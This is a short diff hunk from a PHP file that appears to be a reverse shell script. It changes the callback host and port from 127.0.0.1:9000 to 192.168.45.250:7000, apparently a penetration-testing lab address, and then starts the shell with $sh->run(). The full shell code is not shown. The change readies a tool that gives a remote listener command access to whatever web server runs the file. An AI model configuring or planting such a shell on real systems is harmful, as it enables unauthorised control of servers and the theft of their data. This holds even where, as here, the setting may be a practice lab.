@@ -174,7 +174,7 @@ class Shell {
 }
 echo '<pre>';
 // change the host address and/or port number as necessary
-$sh = new Shell('127.0.0.1', 9000);
+$sh = new Shell('192.168.45.250', 7000);
 $sh->run();
 unset($sh);
 // garbage collector requires PHP v5.3.0 or greater
